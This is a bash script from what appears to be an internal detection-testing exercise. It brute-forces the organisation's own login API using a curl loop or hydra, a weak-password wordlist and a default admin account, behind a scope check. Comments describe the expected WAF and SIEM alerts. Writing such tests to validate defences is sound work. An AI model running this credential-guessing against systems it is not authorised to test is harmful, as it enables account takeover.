#!/bin/bash
# 02 - Login brute-force against our own auth API only.
# Target: POST /api/auth/login (JSON {email, password}) through the WAF.
# Expected detection: AuthBruteForce (Loki), LoginFailureSpike (Prometheus),
#   event_type=auth_failure / auth_login_attempts_total{result="failure"}.
# Expected response: WAF rate-limit / block IP, SIEM alert. (Availability is
#   not affected - this is a compromise-attempt scenario, not a DoS.)
# Usage: TARGET=172.16.147.10 ./bruteforce.sh
#   Env: TARGET, PORT, LOGIN_PATH, LOGIN_USER (preferred), USERNAME (fallback), WORDLIST, FAIL_CODE
#        MODE=json (default, matches FastAPI) | form (hydra, urlencoded)
#   Note zsh: USERNAME est un paramètre réservé ; utiliser LOGIN_USER=... ou env USERNAME=...
set -euo pipefail
source "$(dirname "$0")/../_lib/guard.sh"

TARGET="${TARGET:-172.16.147.10}"
PORT="${PORT:-8080}"
LOGIN_PATH="${LOGIN_PATH:-/api/auth/login}"
LOGIN_USER="${LOGIN_USER:-${USERNAME:-admin@resilience.local}}"
WORDLIST="${WORDLIST:-$(dirname "$0")/wordlist-small.txt}"
MODE="${MODE:-json}"
USER_FIELD="${USER_FIELD:-email}"
PASS_FIELD="${PASS_FIELD:-password}"
FAIL_CODE="${FAIL_CODE:-401}"
ra_require_scope "$TARGET"

if [ ! -f "$WORDLIST" ]; then
  echo "[*] Creating demo wordlist $WORDLIST (padded to trip the WAF threshold)."
  printf '%s\n' password 123456 azerty pay123 test123 "Password1!" \
    "Resilience2026!" admin admin123 letmein welcome qwerty motdepasse \
    "Summer2026!" "Pay@2026" changeme root toor "P@ssw0rd" 00000000 > "$WORDLIST"
fi

OUTDIR="$(ra_logdir bruteforce)"
exec > >(tee -a "$OUTDIR/bruteforce.log") 2>&1

echo "[*] Target: http://$TARGET:$PORT$LOGIN_PATH user=$LOGIN_USER mode=$MODE"
echo "[*] Started: $(ra_now)   Wordlist: $WORDLIST ($(wc -l < "$WORDLIST") pw)   Logs: $OUTDIR"

cleanup() { echo ""; echo "[*] Stopping... $(ra_now)"; pkill -f hydra || true; }
trap cleanup INT TERM

json_brute() {
  local url="http://$TARGET:$PORT$LOGIN_PATH" pw code hit=""
  echo "[*] JSON brute (curl), ~2 req/s for control..."
  while IFS= read -r pw; do
    [ -z "$pw" ] && continue
    code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 \
      -H 'Content-Type: application/json' -X POST "$url" \
      -d "{\"$USER_FIELD\":\"$LOGIN_USER\",\"$PASS_FIELD\":\"$pw\"}" || echo 000)
    printf '    %-20s -> HTTP %s\n' "$pw" "$code"
    if [ "$code" = "200" ]; then hit="$pw"; echo "[+] Candidate success: $pw (HTTP 200)"; break; fi
    sleep 0.5
  done < "$WORDLIST"
  [ -z "$hit" ] && echo "[*] No 200 hit (expected: WAF blocks or creds invalid)."
}

form_brute() {
  command -v hydra >/dev/null 2>&1 || { echo "[-] hydra not installed: sudo dnf install hydra"; return 1; }
  echo "[*] Form brute (hydra, t=4) - endpoint must accept urlencoded form..."
  hydra -l "$LOGIN_USER" -P "$WORDLIST" -t 4 -w 5 \
    "$TARGET" http-post-form \
    "$LOGIN_PATH:$USER_FIELD=^USER^&$PASS_FIELD=^PASS^:F=$FAIL_CODE" -s "$PORT" || true
}

case "$MODE" in
  json) json_brute ;;
  form) form_brute ;;
  *) echo "[-] Unknown MODE=$MODE (use json|form)"; exit 1 ;;
esac

echo "[*] Ended: $(ra_now)"
echo "[+] Blue check: Loki '$FAIL_CODE' / event_type=auth_failure, AuthBruteForce + LoginFailureSpike alerts."
